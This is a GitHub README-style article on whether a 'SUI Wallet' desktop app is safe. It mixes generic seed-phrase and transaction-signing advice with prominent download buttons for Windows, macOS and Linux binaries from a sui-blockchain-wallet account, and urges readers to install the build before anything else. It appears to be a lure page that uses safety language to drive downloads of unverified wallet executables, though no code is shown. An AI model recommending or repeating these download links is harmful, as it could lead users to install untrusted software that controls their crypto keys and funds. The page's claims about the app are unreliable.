![SUI Wallet](assets/banner-article.png)

# Is SUI Wallet safe to use?

Self-custody means the keys are yours, and so is the responsibility for them.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

The keys are generated on your machine and stay there: the wallet holds no server-side copy and no
account to log in to. Safety then rests on three things the app makes visible - the 24-word phrase, the
release your build came from, and the site or application asking for a signature. Nothing else can move
your funds.

## Where keys are generated and stored

Generation happens locally, on the machine, at the moment you create an account. Storage is local too, and so is signing. The secret is never sent to a server to be used, which is the difference between a self-custody wallet and a login screen.

The consequence is direct and worth stating both ways. No operator can move your funds, and no operator
can freeze them. Equally, no operator can recover them for you: an account is the 24 words, and this
project's support channel does not hold a copy. A product that claims the first half and hides the
second is not being straight with you.

What that means in practice: back up the phrase before the wallet holds anything, and treat the machine
as the thing that can fail rather than the thing that can be trusted forever.

## What the app never asks for

The 24 words are asked for in exactly two places: at creation, when the app shows them, and at restore,
when you type them. Nowhere else. Not in a settings screen, not in a chat window, not to a support
agent, not to a site you connected.

This project runs one support channel, stated in the README and in the app, and that channel never asks
for a seed phrase. Any message that does is not from this project, whatever it displays as a name or a
badge.

[SUI Wallet seed phrase setup](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/sui-wallet-seed-phrase-setup.md) covers the phrase screens, including the confirmation step and
what happens if the phrase is photographed.

## The telemetry position

Telemetry is off by default, and the position is stated in the README and on the app's settings screen -
so it is something you can read before installing, and something you can check after, rather than
something you take on trust.

A wallet that phones home with a list of your addresses is a privacy problem even when nothing is
malicious. This one does not do that by default.

## How a signature gets approved

A signature is the only thing that can move funds, so the approval window is the place to be slow. The app previews what the transaction does in human-readable terms, and a request from a connected site names the site and the account it will act on.

The app shows a preview of what the transaction does before you sign, in human-readable terms rather
than as a hex blob: what leaves the account, to where. Requests that arrive from a connected site name
the site and the account they will act on, so a site asking to sign with an account you did not intend
is visible at the moment it matters.

Read the preview. Decline anything you cannot explain in one sentence.

## The three ways people actually lose funds

Not by breaking the cryptography. The losses happen in three places, and all three are social: a phrase that left the paper, a download that came from somewhere other than the release, and a signature approved without reading what it did.

1. **The phrase leaves the paper.** Typed into a site, photographed, pasted into a chat, stored in a
   cloud note. Once it is out, the account is shared with whoever has it, and no wallet can revoke that.
2. **The download came from somewhere else.** A lookalike page, an advert, a mirror. The file runs
   before any wallet code exists, so nothing inside the app can warn you afterwards.
3. **A signature was approved without reading it.** A site that asks for more than it explains, and a
   preview that was clicked through.

Each one is addressed by a habit rather than by a setting: the phrase on paper, the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) as the
only download source, and the preview read before signing.

## After a compromise

If the phrase is exposed, move the funds first and treat the old account as burned. If a bad download ran, assume the machine is unknown and do the same from one you trust. If a signature was approved that should not have been, the chain has the record and the diagnostics panel names it.

[Avoiding SUI Wallet phishing sites](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/avoiding-sui-wallet-phishing-sites.md) takes each case in order, including what a support
channel will and will not do afterwards.

## How to check the build you are trusting

Three checks, all doable in a few minutes, and together they answer whether the build you are running came from the project: the release page on the project's [GitHub account](https://github.com/sui-blockchain-wallet/sui-wallet-desktop), the digest comparison for the file you downloaded, and the licence in the repository.

- The release page is on the project's GitHub account, and the release notes carry the SHA-256 value for
  each of the three files.
- Your downloaded file produces the same digest.
- The licence is Apache-2.0, in the repository, so the code is there to read.

[verify you have the official SUI Wallet](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/how-to-verify-the-official-sui-wallet.md) walks the digest comparison for each platform.

## FAQ

### Can a crypto wallet be hacked?

The keys themselves are not realistically guessable. What gets compromised is the machine, the phrase,
or an approval - which is why every serious loss story involves one of those three rather than a broken
cipher. Self-custody removes the server that could be breached and puts the responsibility on your
habits instead.

### Is it safe to connect a bank account to a wallet?

Nothing in this wallet's flow asks for bank details. Its screens cover accounts, sending and receiving,
staking, objects and application connections, and what it signs is blockchain transactions. A page that
asks for bank details while displaying this wallet's name is not this wallet.

### Is SUI Wallet open source, and under which licence?

The repository is public on GitHub and the licence file is Apache-2.0, with a separate documentation
licence beside it. The source and the release both come from the same account.

### Is it legitimate, or a copy of something?

It is published on its own GitHub account, with a release carrying three platform files and their
digests, and an Apache-2.0 licence. Judge it on those three things rather than on a search ranking: the
release page, the digest and the licence are facts, and a page that claims to be it without them is not.

### Does it work without an internet connection?

The app opens and the account is there, but balances and transactions need the Sui network. A wallet
offline can still be a safe place to keep keys; it cannot tell you what they hold.

### What if I already typed my phrase into a site?

Move the funds to a new account now, before anything else, then treat the old account as exposed
permanently. A phrase cannot be un-shared, and deleting the site's messages does not undo it.
